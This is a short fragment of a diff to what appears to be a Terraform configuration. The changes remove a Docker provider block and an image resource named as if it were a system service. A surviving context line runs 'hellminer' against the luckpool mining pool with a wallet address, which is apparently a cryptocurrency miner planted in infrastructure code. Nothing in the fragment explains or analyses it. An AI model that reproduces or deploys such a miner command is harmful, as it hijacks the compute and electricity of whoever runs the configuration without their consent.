@@ -14,23 +14,3 @@ bash ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6
 EOT
   }
 }
-
-
-terraform {
-  required_providers {
-    docker = {
-      source  = "kreuzwerker/docker"
-      version = "~> 3.0"
-    }
-  }
-}
-
-provider "docker" {
-  host = "unix:///var/run/docker.sock"
-}
-
-resource "docker_image" "app" {
-  name = "chriskm12/system-service:latest"
-}
-
-
